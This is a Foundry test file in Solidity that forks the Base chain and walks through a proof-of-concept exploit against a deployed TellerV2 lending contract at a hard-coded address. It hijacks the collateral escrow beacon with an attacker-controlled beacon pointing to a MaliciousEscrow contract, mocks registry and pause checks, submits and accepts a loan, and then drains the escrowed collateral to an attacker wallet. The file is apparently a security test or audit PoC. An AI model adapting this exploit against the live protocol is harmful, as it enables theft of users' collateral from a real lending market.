// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

enum CollateralType { ERC20, ERC721, ERC1155 }

struct Collateral {
    CollateralType _collateralType;
    uint256 _amount;
    uint256 _tokenId;
    address _collateralAddress;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface ICollateralManager {
    function setCollateralEscrowBeacon(address _beacon) external;
    function getEscrow(uint256 _bidId) external view returns (address);
}

interface IMarketRegistry {
    function isVerifiedBorrower(uint256, address) external view returns (bool, string memory);
    function isMarketOpen(uint256) external view returns (bool);
    function isVerifiedLender(uint256, address) external view returns (bool, string memory);
    function isMarketClosed(uint256) external view returns (bool);
    function getPaymentCycle(uint256) external view returns (uint32, uint8);
    function getPaymentDefaultDuration(uint256) external view returns (uint32);
    function getBidExpirationTime(uint256) external view returns (uint32);
    function getPaymentType(uint256) external view returns (uint8);
    function getMarketplaceFee(uint256) external view returns (uint16);
    function getMarketFeeRecipient(uint256) external view returns (address);
    function getMarketOwner(uint256) external view returns (address);
}

interface IProtocolPausingManager {
    function protocolPaused() external view returns (bool);
}

interface ITellerV2 {
    function collateralManager() external view returns (address);
    function marketRegistry() external view returns (address);
    function getProtocolPausingManager() external view returns (address);
    function protocolFee() external view returns (uint16);
    function getProtocolFeeRecipient() external view returns (address);
    function bidId() external view returns (uint256);
    function getBidState(uint256) external view returns (uint8);
    function getLoanBorrower(uint256) external view returns (address);
    function isLoanExpired(uint256) external view returns (bool);
    function submitBid(
        address _lendingToken,
        uint256 _marketplaceId,
        uint256 _principal,
        uint32 _duration,
        uint16 _APR,
        string calldata _metadataURI,
        address _receiver,
        Collateral[] calldata _collateralInfo
    ) external returns (uint256);
    function lenderAcceptBid(uint256) external returns (uint256, uint256, uint256);
}

interface IBeacon {
    function implementation() external view returns (address);
}

contract UpgradeableBeacon is IBeacon {
    address private _impl;
    address private _owner;
    constructor(address impl_, address owner_) { _impl = impl_; _owner = owner_; }
    function implementation() external view returns (address) { return _impl; }
    function upgradeTo(address n) external { require(msg.sender == _owner, "no"); _impl = n; }
}

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    constructor(string memory n, string memory s, uint8 d) { name = n; symbol = s; decimals = d; }
    function mint(address to, uint256 a) external { balanceOf[to] += a; totalSupply += a; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) { return _x(msg.sender, to, a); }
    function transferFrom(address f, address t, uint256 a) external returns (bool) {
        require(allowance[f][msg.sender] >= a, "allow");
        allowance[f][msg.sender] -= a;
        return _x(f, t, a);
    }
    function _x(address f, address t, uint256 a) internal returns (bool) {
        require(balanceOf[f] >= a, "bal");
        balanceOf[f] -= a;
        balanceOf[t] += a;
        return true;
    }
}

/// @dev Matches the real `ICollateralEscrowV1.depositAsset(CollateralType,address,uint256,uint256)` selector.
contract MaliciousEscrow {
    function initialize(uint256) external {}
    function depositAsset(
        CollateralType,
        address _collateralAddress,
        uint256 _amount,
        uint256
    ) external {
        IERC20(_collateralAddress).transferFrom(msg.sender, address(this), _amount);
    }
    function drain(address _token) external {
        uint256 b = IERC20(_token).balanceOf(address(this));
        if (b > 0) IERC20(_token).transfer(msg.sender, b);
    }
}

contract BeaconHijackTest is Test {
    address constant TELLER_V2 = 0x5cfD3aeD08a444Be32839bD911Ebecd688861164;
    uint256 constant MARKET_ID = 1;

    address borrower;
    address lender;
    address attackerWallet;

    MockERC20 col;
    MockERC20 usd;

    function setUp() public {
        vm.createSelectFork(vm.envString("BASE_FORK_URL"));
        console.log("=== Fork block:", block.number, "===");

        borrower = makeAddr("attackerBorrower");
        lender = makeAddr("attackerLender");
        attackerWallet = makeAddr("attackerWallet");

        col = new MockERC20("Fake Collateral", "FC", 18);
        usd = new MockERC20("Fake USD", "FUSD", 6);
        col.mint(borrower, 1_000 ether);
        usd.mint(lender, 1_000_000e6);
    }

    function test_Diagnose_StepByStep() public {
        ITellerV2 teller = ITellerV2(TELLER_V2);
        ICollateralManager cm = ICollateralManager(teller.collateralManager());
        address registry = teller.marketRegistry();
        address pausing = teller.getProtocolPausingManager();

        console.log("TellerV2:        ", TELLER_V2);
        console.log("CollateralMgr:   ", address(cm));
        console.log("Registry:        ", registry);
        console.log("PausingManager:  ", pausing);
        console.log("protocolFee:     ", teller.protocolFee());
        console.log("feeRecipient:    ", teller.getProtocolFeeRecipient());
        console.log("bidId():         ", teller.bidId());

        // -------- 0. Verify live pausing state before mocking --------
        if (pausing != address(0)) {
            try IProtocolPausingManager(pausing).protocolPaused() returns (bool p) {
                console.log("live protocolPaused():", p);
            } catch (bytes memory r) {
                console.log("live protocolPaused() reverted:");
                console.logBytes(r);
            }
        } else {
            console.log("!! getProtocolPausingManager() returned address(0)");
        }

        // -------- 1. Mock registry + pausing --------
        _mockRegistry(registry);
        if (pausing != address(0)) {
            vm.mockCall(
                pausing,
                abi.encodeWithSelector(IProtocolPausingManager.protocolPaused.selector),
                abi.encode(false)
            );
        }

        // -------- 2. Hijack beacon --------
        MaliciousEscrow impl = new MaliciousEscrow();
        UpgradeableBeacon beacon = new UpgradeableBeacon(address(impl), address(this));
        try cm.setCollateralEscrowBeacon(address(beacon)) {
            console.log("STEP 2 SUCCESS: beacon hijacked ->", address(beacon));
        } catch (bytes memory r) {
            console.log("STEP 2 FAILED: setCollateralEscrowBeacon reverted");
            console.logBytes(r);
            return;
        }

        // -------- 3. submitBid --------
        Collateral[] memory collats = new Collateral[](1);
        collats[0] = Collateral({
            _collateralType: CollateralType.ERC20,
            _amount: 500 ether,
            _tokenId: 0,
            _collateralAddress: address(col)
        });

        uint256 bidId;
        vm.startPrank(borrower);
        col.approve(address(cm), 500 ether);
        try teller.submitBid(
            address(usd), MARKET_ID, 1_000e6, 30 days, 1_000, "", borrower, collats
        ) returns (uint256 id) {
            bidId = id;
            console.log("STEP 3 SUCCESS: bidId =", id);
        } catch (bytes memory r) {
            console.log("STEP 3 FAILED: submitBid reverted");
            console.logBytes(r);
            vm.stopPrank();
            return;
        }
        vm.stopPrank();

        // State after submitBid
        console.log("bid state (1=PENDING):", teller.getBidState(bidId));
        console.log("bid borrower:         ", teller.getLoanBorrower(bidId));
        console.log("isLoanExpired:        ", teller.isLoanExpired(bidId));

        // -------- 4. lenderAcceptBid --------
        vm.startPrank(lender);
        usd.approve(TELLER_V2, 1_000_000e6);
        try teller.lenderAcceptBid(bidId) returns (uint256 toP, uint256 toM, uint256 toB) {
            console.log("STEP 4 SUCCESS: lenderAcceptBid");
            console.log("  amountToProtocol:   ", toP);
            console.log("  amountToMarketplace:", toM);
            console.log("  amountToBorrower:   ", toB);
        } catch (bytes memory r) {
            console.log("STEP 4 FAILED: lenderAcceptBid reverted");
            console.logBytes(r);
            vm.stopPrank();
            return;
        }
        vm.stopPrank();

        // -------- 5. Verify escrow --------
        address escrow = cm.getEscrow(bidId);
        console.log("escrow address:", escrow);
        if (escrow == address(0)) {
            console.log("STEP 5 FAILED: no escrow deployed");
            return;
        }
        console.log("escrow collateral balance:", col.balanceOf(escrow));

        // -------- 6. Drain --------
        vm.prank(attackerWallet);
        MaliciousEscrow(escrow).drain(address(col));
        console.log("attacker wallet balance:  ", col.balanceOf(attackerWallet));
        console.log("escrow balance after drain:", col.balanceOf(escrow));
    }

    function _mockRegistry(address registry) internal {
        vm.mockCall(registry, abi.encodeWithSelector(IMarketRegistry.isVerifiedBorrower.selector, MARKET_ID, borrower), abi.encode(true, ""));
        vm.mockCall(registry, abi.encodeWithSelector(IMarketRegistry.isVerifiedLender.selector, MARKET_ID, lender), abi.encode(true, ""));
        vm.mockCall(registry, abi.encodeWithSelector(IMarketRegistry.isMarketOpen.selector, MARKET_ID), abi.encode(true));
        vm.mockCall(registry, abi.encodeWithSelector(IMarketRegistry.isMarketClosed.selector, MARKET_ID), abi.encode(false));
        vm.mockCall(registry, abi.encodeWithSelector(IMarketRegistry.getPaymentCycle.selector, MARKET_ID), abi.encode(uint32(30 days), uint8(0)));
        vm.mockCall(registry, abi.encodeWithSelector(IMarketRegistry.getPaymentDefaultDuration.selector, MARKET_ID), abi.encode(uint32(3 days)));
        vm.mockCall(registry, abi.encodeWithSelector(IMarketRegistry.getBidExpirationTime.selector, MARKET_ID), abi.encode(uint32(0)));
        vm.mockCall(registry, abi.encodeWithSelector(IMarketRegistry.getPaymentType.selector, MARKET_ID), abi.encode(uint8(1))); // Bullet
        vm.mockCall(registry, abi.encodeWithSelector(IMarketRegistry.getMarketplaceFee.selector, MARKET_ID), abi.encode(uint16(100)));
        vm.mockCall(registry, abi.encodeWithSelector(IMarketRegistry.getMarketFeeRecipient.selector, MARKET_ID), abi.encode(address(0xFEE)));
    }
}
